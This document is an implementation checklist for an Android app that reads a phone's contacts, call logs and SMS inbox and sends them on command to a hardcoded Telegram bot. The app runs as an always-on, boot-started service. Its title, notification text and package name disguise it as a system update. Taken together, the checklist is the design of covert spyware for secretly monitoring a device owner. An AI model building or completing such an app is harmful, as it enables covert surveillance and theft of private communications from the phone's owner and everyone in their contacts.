# Implementation - Device Relay

## Done:

1. **Contacts Reading**
   - Query device contacts using ContactsContract
   - Deduplicate by normalized phone number
   - Sort by name ascending (case-insensitive)
   - Paginated: 50 per page (/contacts, /contacts2)

2. **Call Log Reading**
   - Query call logs using CallLog.Calls
   - Filter by IST timezone date (today/yesterday)
   - Show type: INCOMING (🟢), OUTGOING (🔴), MISSED (⚫)
   - Show duration in Xm Ys format

3. **SMS Reading**
   - Query SMS from content://sms/inbox
   - Resolve contact names from phone numbers
   - Paginated: 10 per page (/msgs1, /msgs2, /msgs3)
   - Truncate body to 120 chars with "..."

4. **Telegram Bot API**
   - Hardcoded BOT_TOKEN and CHAT_ID
   - getUpdates polling every 3 seconds
   - sendMessage with HTML parse mode
   - Long message splitting (>4000 chars)
   - Retry on failure after 2 seconds

5. **Foreground Service**
   - Runs in background continuously
   - Notification: "Updating system" / "System update in progress..."
   - Auto-starts on boot (BOOT_COMPLETED receiver)
   - Uses LifecycleService

6. **Security**
   - Only accepts commands from hardcoded CHAT_ID
   - HTML special chars escaped (&, <, >)
   - No !! operators (null-safe)
   - Cursors closed with .use{}

7. **UI (MainActivity)**
   - Title: "System Update"
   - Service status (Running ✅ / Stopped 🔴)
   - Toggle button: Start/Stop Service
   - Grant Permissions button
   - Shows missing permissions warning in red

8. **App Icon**
   - Blue background (#3F51B5) with white "i" symbol
   - Adaptive icon for Android 8+
   - Round icon variant

9. **Message Formatting**
   - HTML parse mode for Telegram
   - Circular numbers for SMS (①②③④⑤⑥⑦⑧⑨⑩)
   - Emoji icons for call types
   - Pagination hints for contacts

## Commands:
- /contacts - First 50 contacts
- /contacts2 - Next 50 contacts
- /calllog1 - Today's call logs
- /calllog2 - Yesterday's call logs
- /msgs1 - First 10 SMS
- /msgs2 - Next 10 SMS
- /msgs3 - Next 10 SMS (page 3)
- /status - Check if online

## Package:
- com.systemui.package

## Min SDK:
- 26 (Android 8.0)

## Target SDK:
- 34 (Android 14)

## Files:
- Config.kt
- TelegramApi.kt
- TelegramService.kt
- CommandHandler.kt
- MainActivity.kt
- BootReceiver.kt
- data/ContactsRepository.kt
- data/CallLogRepository.kt
- data/SmsRepository.kt
- model/DataModels.kt
- utils/DateUtils.kt
- utils/PermissionHelper.kt
- utils/MessageFormatter.kt
